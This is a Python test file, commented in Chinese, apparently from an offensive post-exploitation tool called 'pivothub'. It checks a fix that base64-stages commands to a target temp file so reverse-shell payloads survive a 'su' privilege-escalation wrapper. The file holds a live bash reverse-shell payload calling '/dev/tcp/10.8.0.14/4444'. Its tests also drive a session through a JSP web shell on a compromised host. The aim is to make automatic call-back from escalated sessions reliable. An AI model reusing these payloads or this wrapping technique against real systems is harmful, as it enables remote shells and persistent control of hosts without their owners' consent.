"""提权包裹器引号安全（回归：`Bad fd number`）。

背景：包裹器模板形如 `script -qc "su ph -c %CMD%" /dev/null`，`%CMD%` 位于**双引号内**。
早期实现直接把 `shlex.quote(cmd)` 内联；当命令含单引号时 shlex 会产出 `'"'"'`，
其中那个双引号会**提前结束模板的引号**，命令被撕成碎片 —— 目标侧表现为
`/bin/sh: 1: Syntax error: Bad fd number` 或 `script: cannot open ...: No such file`。
反弹 Shell 载荷必然含单引号，所以在「已提权」的会话上自动回连必炸。

修法：`wrap_privileged_cmd()` 把命令 base64 落到目标临时文件，让包裹器只执行
`sh <文件>`（无引号风险），命令本体不再被任何一层 shell 重新解析。
"""

from __future__ import annotations

from pivothub.session.base import apply_cmd_wrapper, wrap_privileged_cmd
from pivothub.session.http_shell import HttpShellSession

#: 出问题时用户实际配置的包裹器原样（含双引号）
REAL_WRAPPER = 'script -qc "su ph -c %CMD%" /dev/null </dev/null 2>&1'

#: 自动回连用的真实载荷（含单引号 → 触发老 bug）
REVERSE_PAYLOAD = "nohup bash -c 'bash -i >& /dev/tcp/10.8.0.14/4444 0>&1' >/dev/null 2>&1 &"


def test_wrapped_cmd_does_not_inline_payload():
    """载荷不再内联进包裹器（否则引号会被模板的双引号撕碎）。"""
    out = wrap_privileged_cmd(REVERSE_PAYLOAD, REAL_WRAPPER)
    assert "/dev/tcp" not in out
    assert "base64 -d >" in out
    assert "sh /tmp/.pivothub_" in out


def test_wrapped_cmd_template_quotes_not_broken():
    """关键不变量：替换后除了模板自带的两个双引号，不得再出现任何双引号。"""
    out = wrap_privileged_cmd(REVERSE_PAYLOAD, REAL_WRAPPER)
    inner = out.split(" && ", 1)[1]
    assert inner.count('"') == 2, inner
    # 包裹器结构完整：su ph -c '%CMD%'（收尾的 rm -f 是清理，不属于模板）
    wrapped = inner.split("; rm -f ", 1)[0]
    assert 'su ph -c ' in wrapped
    assert wrapped.rstrip().endswith("2>&1")
    assert 'sh /tmp/.pivothub_' in wrapped


def test_wrapped_cmd_payload_is_recoverable():
    """落盘的 base64 必须能还原出原始命令（不能改内容）。"""
    import base64

    out = wrap_privileged_cmd(REVERSE_PAYLOAD, REAL_WRAPPER)
    b64 = out.split("echo ", 1)[1].split(" | base64 -d", 1)[0]
    assert base64.b64decode(b64).decode("utf-8") == REVERSE_PAYLOAD


def test_no_wrapper_is_passthrough():
    """无包裹器 / 无 %CMD% 占位符 → 原样返回（保持既有行为，零额外开销）。"""
    assert wrap_privileged_cmd(REVERSE_PAYLOAD, "") == REVERSE_PAYLOAD
    assert wrap_privileged_cmd(REVERSE_PAYLOAD, "sh -c nope") == REVERSE_PAYLOAD


def test_windows_keeps_inline_behaviour():
    """Windows 目标无 /bin/sh 与 base64 -d → 维持内联（不引入新失败模式）。"""
    assert wrap_privileged_cmd("id", "echo %CMD%", platform="windows") == "echo id"


def test_apply_cmd_wrapper_unchanged_for_simple_cmd():
    """旧入口仍可用（简单命令无引号风险）。"""
    assert apply_cmd_wrapper("id", "sh -c %CMD%") == "sh -c id"


def test_http_shell_exec_routes_through_wrapped_file(monkeypatch):
    """真实接线：HttpShellSession.exec 在挂包裹器时必须走「落盘 + sh 文件」，
    而不是把整条载荷内联下发。"""
    s = HttpShellSession(url="http://10.0.0.9/cmd.jsp", shell_type="JSP 一句话马",
                         platform="linux")
    s.cmd_wrapper = REAL_WRAPPER

    seen: dict = {}

    def fake_post(self, fields, timeout=None):
        seen.update(fields)
        return 200, 1, "ok"

    monkeypatch.setattr(HttpShellSession, "_post", fake_post)
    s.exec(REVERSE_PAYLOAD)

    sent = "".join(seen.values())
    assert "/dev/tcp" not in sent          # 载荷未内联
    assert "base64 -d >" in sent           # 已落盘
    assert sent.count('"') == 2            # 模板引号未被破坏
    s.close()


def test_http_shell_exec_without_wrapper_sends_command_verbatim(monkeypatch):
    """无提权上下文时行为不变：命令原样下发（不被 base64 包裹）。"""
    s = HttpShellSession(url="http://10.0.0.9/cmd.jsp", shell_type="JSP 一句话马",
                         platform="linux")
    seen: dict = {}

    def fake_post(self, fields, timeout=None):
        seen.update(fields)
        return 200, 1, "ok"

    monkeypatch.setattr(HttpShellSession, "_post", fake_post)
    s.exec("echo hello")
    assert "echo hello" in "".join(seen.values())
    assert "base64 -d" not in "".join(seen.values())
    s.close()
